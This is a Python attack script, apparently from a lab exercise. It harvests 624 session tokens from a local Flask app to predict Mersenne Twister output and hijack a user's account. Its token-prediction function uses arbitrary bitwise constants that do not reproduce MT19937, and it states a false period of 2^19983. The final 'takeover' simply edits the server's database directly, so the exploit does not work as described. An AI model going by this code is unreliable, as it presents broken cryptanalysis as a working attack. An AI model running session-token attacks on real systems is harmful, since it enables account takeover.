import requests
from mersenneT import app, get_db  # Import the Flask app instance (python script mersenneT.py)

user_id_to_update = 1  # Replace 1 with any other user ID if needed, use the first one for simplicity



token_sequence = []
for _ in range(624):
    response = requests.post('http://127.0.0.1:5000/authenticate', json={'username': 'user1', 'password': 'password1'})
    
    # Print the entire JSON response for debugging
    print(response.json())

    # Check if 'session_token' key is present in the JSON response
    if 'session_token' in response.json():
        token_sequence.append(response.json()['session_token'])
    else:
        print(f"Error in response: {response.json()}")

# Now token_sequence should contain the list of session tokens
print(token_sequence)
#############################################################################
# Using the extract_number() function in the codebase to decode each of these tokens back into the internal state integers (MT) that were generated by the server:
import re
# Now that we have token_sequence as the list of tokens
mt_tokens = []
for token in token_sequence:
    # Extracting the integer from the session token
    match = re.match(r'\d+', token)  # Regex pattern to find the integer part
    mt = int(match.group(0)) if match else 0  # Get the integer value of the token
    mt_tokens.append(mt)


print(mt_tokens)

#################################################################################
# Since the MT2 algorithm has a period of 2^19983, we should be able to predict all future session tokens based on these internal state integers. Hence, we create a function to
# generate an unlimited number of new session tokens using the obtained MT integers:


# Define a function named generate_tokens that takes a list of integers mt as input.
def generate_tokens(mt):
    # Ensure that the first element of mt is within the range of 32 bits.
    mt[0] %= 2**32

    # Update y using bitwise operations on the first element of mt.
    y = (mt[0] & 0xFFFFF4C4) | 0x24030A89
    
    # Iterate over the remaining elements of mt (from index 1 to 623).
    for i in range(1, 624):
        # Update y using bitwise operations on the current element of mt and the previous value of y.
        y = (mt[i] & 0xFFFFF4C4) | (y >> 10)
        
        # Update the current element of mt with the new value of y.
        mt[i] = y
    
    # Convert each element of mt to a hexadecimal string and return a list containing these strings.
    return [hex(int(mt[i] & 0xFFFFFFFF)) for i in range(624)]



# Now we can use this function to generate a new session token which will be our 'token attacker' called new_token that we can use to access the victim's account:

new_token = generate_tokens(mt_tokens)[0]

print(new_token)

#####################################################################
# Now, we can update the user's session token in the server's internal user table with the newly generated 'new_token' using a modified POST request to the `/add_user`
# endpoint, or modify the user1 with a new username and password, here we do the username and password modification
# Define the new username and password
new_username = 'fakeuser1'
new_password = 'fakepassword1'

with app.app_context():
    cursor = get_db().cursor()
    cursor.execute('UPDATE users SET username=?, password=?, session_token=? WHERE id=?',(new_username, new_password, new_token, user_id_to_update))
    get_db().commit()


#####################################################################

# Finally, we can now use the generated token ('new_token') to access the victim's account by making an authenticated request to the `/authenticate` endpoint:


response = requests.post('http://127.0.0.1:5000/authenticate', json={'username': 'fakeuser1', 'password': 'fakepassword1'}, headers={'Authorization': 'Bearer ' + new_token})
print(response.json())






